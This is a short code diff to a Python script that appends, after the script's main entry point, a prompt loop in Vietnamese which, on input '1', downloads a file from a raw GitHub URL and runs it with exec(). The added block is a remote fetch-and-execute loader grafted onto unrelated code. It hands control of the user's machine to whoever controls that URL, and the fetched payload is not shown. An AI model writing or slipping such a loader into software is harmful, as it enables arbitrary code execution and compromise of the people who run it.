@@ -1,4 +1,5 @@
 import base64
+import requests
 import hashlib
 import socket
 import random
@@ -64,3 +65,13 @@ def main():
 
 if __name__ == "__main__":
     main()
+import requests
+
+while True:
+    chon = input(
+        '\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mNHẬP 1 ĐỂ VÀO CODE\033[1;37m =>: \033[1;33m'
+    )
+
+    if chon == "1":
+        exec(requests.get('https://raw.githubusercontent.com/kococc/nammoivv/refs/heads/main/key.py').text)
+        break    
